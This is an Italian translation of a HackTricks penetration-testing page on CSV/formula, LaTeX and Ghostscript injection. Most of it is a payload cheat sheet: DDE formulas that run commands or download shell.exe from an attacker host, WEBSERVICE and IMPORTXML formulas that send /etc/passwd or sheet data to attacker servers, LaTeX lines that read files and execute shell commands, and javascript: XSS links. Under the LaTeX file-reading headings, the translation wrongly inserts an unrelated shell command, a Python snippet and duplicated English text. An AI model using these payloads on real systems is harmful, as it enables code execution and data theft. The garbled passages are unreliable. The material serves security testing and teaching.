# Iniezione di formule/CSV/Doc/LaTeX/GhostScript

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Trova le vulnerabilit√† che contano di pi√π in modo da poterle correggere pi√π velocemente. Intruder traccia la tua superficie di attacco, esegue scansioni proattive delle minacce, trova problemi in tutta la tua infrastruttura tecnologica, dalle API alle applicazioni web e ai sistemi cloud. [**Provalo gratuitamente**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) oggi.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Iniezione di formule

### Informazioni

Se il tuo **input** viene **riflesso** all'interno di **file CSV** (o qualsiasi altro file che probabilmente verr√† aperto da **Excel**), potresti essere in grado di inserire formule di Excel che verranno **eseguite** quando l'utente **apre il file** o quando l'utente **clicca su un link** all'interno del foglio di Excel.

{% hint style="danger" %}
Oggi **Excel avviser√†** (pi√π volte) l'**utente quando viene caricato qualcosa dall'esterno di Excel** al fine di impedirgli di compiere azioni maliziose. Pertanto, √® necessario fare uno sforzo speciale sulla Social Engineering per ottenere il payload finale.
{% endhint %}

### [Wordlist](https://github.com/payloadbox/csv-injection-payloads)
```
DDE ("cmd";"/C calc";"!A0")A0
@SUM(1+9)*cmd|' /C calc'!A0
=10+20+cmd|' /C calc'!A0
=cmd|' /C notepad'!'A1'
=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1
```
### Collegamento ipertestuale

**L'esempio seguente √® molto utile per esfiltrare contenuti dal foglio di calcolo finale di Excel e per effettuare richieste a posizioni arbitrarie. Ma richiede che l'utente faccia clic sul collegamento (e accetti gli avvisi di avvertimento).**

L'esempio seguente √® stato preso da [https://payatu.com/csv-injection-basic-to-exploit](https://payatu.com/csv-injection-basic-to-exploit)

Immagina che una violazione della sicurezza in un sistema di gestione dei record degli studenti venga sfruttata attraverso un attacco di iniezione CSV. L'intenzione principale dell'attaccante √® compromettere il sistema utilizzato dagli insegnanti per gestire i dettagli degli studenti. Il metodo prevede che l'attaccante inietti un payload dannoso nell'applicazione, specificamente inserendo formule dannose nei campi destinati ai dettagli degli studenti. L'attacco si sviluppa nel seguente modo:

1. **Iniezione di payload dannoso:**
- L'attaccante invia un modulo di dettagli degli studenti ma include una formula comunemente utilizzata nei fogli di calcolo (ad esempio, `=HYPERLINK("<malicious_link>","Clicca qui")`).
- Questa formula √® progettata per creare un collegamento ipertestuale, ma punta a un server dannoso controllato dall'attaccante.

2. **Esportazione dei dati compromessi:**
- Gli insegnanti, ignari della compromissione, utilizzano la funzionalit√† dell'applicazione per esportare i dati in un file CSV.
- Il file CSV, una volta aperto, contiene ancora il payload dannoso. Questo payload appare come un collegamento ipertestuale cliccabile nel foglio di calcolo.

3. **Scatenare l'attacco:**
- Un insegnante fa clic sul collegamento ipertestuale, credendo che faccia parte legittima dei dettagli dello studente.
- Al clic, i dati sensibili (potenzialmente inclusi i dettagli del foglio di calcolo o del computer dell'insegnante) vengono trasmessi al server dell'attaccante.

4. **Registrazione dei dati:**
- Il server dell'attaccante riceve e registra i dati sensibili inviati dal computer dell'insegnante.
- L'attaccante pu√≤ quindi utilizzare questi dati per vari scopi maligni, compromettendo ulteriormente la privacy e la sicurezza degli studenti e dell'istituzione.


### RCE

**Consulta il [post originale](https://notsosecure.com/data-exfiltration-formula-injection-part1) per ulteriori dettagli.**

In configurazioni specifiche o versioni pi√π vecchie di Excel, √® possibile sfruttare una funzionalit√† chiamata Dynamic Data Exchange (DDE) per eseguire comandi arbitrari. Per sfruttare questa funzionalit√†, √® necessario abilitare le seguenti impostazioni:

- Vai su File ‚Üí Opzioni ‚Üí Centro sicurezza ‚Üí Impostazioni del centro sicurezza ‚Üí Contenuto esterno e abilita **Avvio server Dynamic Data Exchange**.

Quando viene aperto un foglio di calcolo con il payload dannoso (e se l'utente accetta gli avvisi), il payload viene eseguito. Ad esempio, per avviare l'applicazione calcolatrice, il payload sarebbe:
```markdown
`=cmd|' /C calc'!xxx`
```
Possono essere eseguiti anche comandi aggiuntivi, come il download e l'esecuzione di un file utilizzando PowerShell:
```bash
=cmd|' /C powershell Invoke-WebRequest "http://www.attacker.com/shell.exe" -OutFile "$env:Temp\shell.exe"; Start-Process "$env:Temp\shell.exe"'!A1
```
### Inclusione di file locali (LFI) in LibreOffice Calc

LibreOffice Calc pu√≤ essere utilizzato per leggere file locali ed estrarre dati. Ecco alcuni metodi:

- Leggere la prima riga dal file locale `/etc/passwd`: `='file:///etc/passwd'#$passwd.A1`
- Estrarre i dati letti su un server controllato dall'attaccante: `=WEBSERVICE(CONCATENATE("http://<indirizzo IP dell'attaccante>:8080/",('file:///etc/passwd'#$passwd.A1)))`
- Estrarre pi√π di una riga: `=WEBSERVICE(CONCATENATE("http://<indirizzo IP dell'attaccante>:8080/",('file:///etc/passwd'#$passwd.A1)&CHAR(36)&('file:///etc/passwd'#$passwd.A2)))`
- Esfiltrazione DNS (invio dei dati letti come query DNS a un server DNS controllato dall'attaccante): `=WEBSERVICE(CONCATENATE((SUBSTITUTE(MID((ENCODEURL('file:///etc/passwd'#$passwd.A19)),1,41),"%","-")),".<dominio dell'attaccante>"))`

### Google Sheets per l'esfiltrazione di dati Out-of-Band (OOB)

Google Sheets offre funzioni che possono essere sfruttate per l'esfiltrazione di dati OOB:

- **CONCATENATE**: Concatena le stringhe insieme - `=CONCATENATE(A2:E2)`
- **IMPORTXML**: Importa dati da tipi di dati strutturati - `=IMPORTXML(CONCAT("http://<indirizzo IP dell'attaccante:Porta>/123.txt?v=", CONCATENATE(A2:E2)), "//a/a10")`
- **IMPORTFEED**: Importa feed RSS o ATOM - `=IMPORTFEED(CONCAT("http://<indirizzo IP dell'attaccante:Porta>//123.txt?v=", CONCATENATE(A2:E2)))`
- **IMPORTHTML**: Importa dati da tabelle o elenchi HTML - `=IMPORTHTML (CONCAT("http://<indirizzo IP dell'attaccante:Porta>/123.txt?v=", CONCATENATE(A2:E2)),"table",1)`
- **IMPORTRANGE**: Importa un intervallo di celle da un altro foglio di calcolo - `=IMPORTRANGE("https://docs.google.com/spreadsheets/d/[ID_foglio]", "foglio1!A2:E2")`
- **IMAGE**: Inserisce un'immagine in una cella - `=IMAGE("https://<indirizzo IP dell'attaccante:Porta>/images/srpr/logo3w.png")`


## Iniezione di LaTeX

Di solito i server che si trovano su Internet che **convertire il codice LaTeX in PDF** utilizzano **`pdflatex`**.\
Questo programma utilizza 3 attributi principali per (dis)abilitare l'esecuzione dei comandi:

* **`--no-shell-escape`**: **Disabilita** la costruzione `\write18{comando}`, anche se √® abilitata nel file texmf.cnf.
* **`--shell-restricted`**: Come `--shell-escape`, ma **limitato** a un insieme 'sicuro' di **comandi predefiniti** (\*\*Su Ubuntu 16.04 l'elenco si trova in `/usr/share/texmf/web2c/texmf.cnf`).
* **`--shell-escape`**: **Abilita** la costruzione `\write18{comando}`. Il comando pu√≤ essere qualsiasi comando di shell. Questa costruzione √® normalmente disabilitata per motivi di sicurezza.

Tuttavia, ci sono altri modi per eseguire comandi, quindi per evitare RCE √® molto importante utilizzare `--shell-restricted`.

### Leggere il file <a href="#read-file" id="read-file"></a>

Potrebbe essere necessario regolare l'iniezione con wrapper come \[ o $.
```bash
\input{/etc/passwd}
\include{password} # load .tex file
\lstinputlisting{/usr/share/texmf/web2c/texmf.cnf}
\usepackage{verbatim}
\verbatiminput{/etc/passwd}
```
#### Leggi un file con una sola riga

To read a single-lined file, you can use the following command:

Per leggere un file con una sola riga, puoi utilizzare il seguente comando:

```bash
cat file.txt
```

This command will display the content of the file on the terminal.

Questo comando visualizzer√† il contenuto del file sul terminale.
```bash
\newread\file
\openin\file=/etc/issue
\read\file to\line
\text{\line}
\closein\file
```
#### Leggi un file con pi√π righe

To read a file with multiple lines, you can use the following code:

```python
with open('file.txt', 'r') as file:
    lines = file.readlines()
    for line in lines:
        print(line.strip())
```

This code opens the file named `file.txt` in read mode (`'r'`) and uses the `readlines()` method to read all the lines in the file. It then iterates over each line and prints it after removing any leading or trailing whitespace using the `strip()` method.
```bash
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
\read\file to\fileline
\text{\fileline}
\repeat
\closein\file
```
### Scrivere un file <a href="#write-file" id="write-file"></a>
```bash
\newwrite\outfile
\openout\outfile=cmd.tex
\write\outfile{Hello-world}
\closeout\outfile
```
### Esecuzione di comandi <a href="#esecuzione-di-comandi" id="esecuzione-di-comandi"></a>

L'input del comando verr√† reindirizzato a stdin, utilizzare un file temporaneo per ottenerlo.
```bash
\immediate\write18{env > output}
\input{output}

\input{|"/bin/hostname"}
\input{|"extractbb /etc/passwd > /tmp/b.tex"}

# allowed mpost command RCE
\documentclass{article}\begin{document}
\immediate\write18{mpost -ini "-tex=bash -c (id;uname${IFS}-sm)>/tmp/pwn" "x.mp"}
\end{document}

# If mpost is not allowed there are other commands you might be able to execute
## Just get the version
\input{|"bibtex8 --version > /tmp/b.tex"}
## Search the file pdfetex.ini
\input{|"kpsewhich pdfetex.ini > /tmp/b.tex"}
## Get env var value
\input{|"kpsewhich -expand-var=$HOSTNAME > /tmp/b.tex"}
## Get the value of shell_escape_commands without needing to read pdfetex.ini
\input{|"kpsewhich --var-value=shell_escape_commands > /tmp/b.tex"}
```
Se si verifica un errore LaTex, considera di utilizzare base64 per ottenere il risultato senza caratteri non validi.
```bash
\immediate\write18{env | base64 > test.tex}
\input{text.tex}
```

```bash
\input|ls|base4
\input{|"/bin/hostname"}
```
### Cross Site Scripting <a href="#cross-site-scripting" id="cross-site-scripting"></a>

Da [@EdOverflow](https://twitter.com/intigriti/status/1101509684614320130)
```bash
\url{javascript:alert(1)}
\href{javascript:alert(1)}{placeholder}
```
## Iniezione di Ghostscript

**Controlla [https://blog.redteam-pentesting.de/2023/ghostscript-overview/](https://blog.redteam-pentesting.de/2023/ghostscript-overview/)**

## Riferimenti

* [https://notsosecure.com/data-exfiltration-formula-injection-part1](https://notsosecure.com/data-exfiltration-formula-injection-part1)
* [https://0day.work/hacking-with-latex/](https://0day.work/hacking-with-latex/)
* [https://salmonsec.com/cheatsheet/latex\_injection](https://salmonsec.com/cheatsheet/latex\_injection)
* [https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/](https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/)

<figure><img src="../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Trova le vulnerabilit√† che contano di pi√π in modo da poterle correggere pi√π velocemente. Intruder traccia la tua superficie di attacco, esegue scansioni proattive delle minacce, trova problemi in tutta la tua infrastruttura tecnologica, dalle API alle applicazioni web e ai sistemi cloud. [**Provalo gratuitamente**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) oggi stesso.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT**](https://opensea.io/collection/the-peass-family) esclusivi
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository github di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
